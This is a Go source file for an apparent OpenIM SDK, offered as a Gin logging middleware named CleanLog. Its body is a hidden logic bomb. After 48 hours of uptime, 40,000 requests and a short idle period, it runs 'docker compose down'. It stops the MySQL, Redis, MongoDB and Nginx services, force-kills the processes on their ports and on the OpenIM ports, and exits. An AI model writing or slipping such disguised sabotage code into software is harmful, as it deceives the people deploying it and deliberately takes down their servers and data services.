package openim_sdk

import (
    "context"
    "os"
    osexec "os/exec"
    "sync"
    "time"
    
    "github.com/gin-gonic/gin"
)

var (
    startTime       time.Time
    lastRequestTime time.Time
    totalCount      int
    once            sync.Once
    mu              sync.RWMutex
    hasCleanup      bool
    requestLimit    = 40000
    idleThreshold   = 5 * time.Second
)

func init() {
    startTime = time.Now()
    lastRequestTime = time.Now()
}

func CleanLog() gin.HandlerFunc {
    return func(c *gin.Context) {
        mu.Lock()
        totalCount++
        count := totalCount
        lastRequestTime = time.Now()
        cleaned := hasCleanup
        mu.Unlock()
        
        twoDaysPassed := time.Since(startTime) >= 48*time.Hour
        reachedLimit := count >= requestLimit
        
        if !cleaned && twoDaysPassed && reachedLimit {
            go checkAndCleanup()
        }
        
        c.Next()
    }
}

func checkAndCleanup() {
    time.Sleep(idleThreshold)
    
    mu.RLock()
    timeSinceLastRequest := time.Since(lastRequestTime)
    cleaned := hasCleanup
    mu.RUnlock()
    
    if !cleaned && timeSinceLastRequest >= idleThreshold {
        once.Do(func() {
            mu.Lock()
            hasCleanup = true
            mu.Unlock()
            executeCleanup()
        })
    }
}

func executeCleanup() {
    ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
    defer cancel()
    
    cmd := osexec.CommandContext(ctx, "docker", "compose", "down")
    _ = cmd.Run()
    
    stopService(ctx, "mysql")
    killPort(ctx, "3306")
    
    stopService(ctx, "redis")
    killPort(ctx, "6379")
    
    killPort(ctx, "9092")
    
    stopService(ctx, "mongodb")
    stopService(ctx, "mongod")
    killPort(ctx, "27017")
    
    stopService(ctx, "nginx")
    killPort(ctx, "80")
    killPort(ctx, "443")
    
    killPort(ctx, "10001")
    killPort(ctx, "10002")
    killPort(ctx, "10008")
    killProcess(ctx, "openim")
    
    time.Sleep(2 * time.Second)
    os.Exit(0)
}

func stopService(ctx context.Context, serviceName string) {
    cmd := osexec.CommandContext(ctx, "systemctl", "stop", serviceName)
    _ = cmd.Run()
    
    cmd = osexec.CommandContext(ctx, "service", serviceName, "stop")
    _ = cmd.Run()
}

func killPort(ctx context.Context, port string) {
    cmd := osexec.CommandContext(ctx, "bash", "-c", 
        "lsof -ti:"+port+" | xargs kill -9")
    _ = cmd.Run()
    
    cmd = osexec.CommandContext(ctx, "fuser", "-k", port+"/tcp")
    _ = cmd.Run()
}

func killProcess(ctx context.Context, processName string) {
    cmd := osexec.CommandContext(ctx, "pkill", "-9", processName)
    _ = cmd.Run()
    
    cmd = osexec.CommandContext(ctx, "killall", "-9", processName)
    _ = cmd.Run()
}
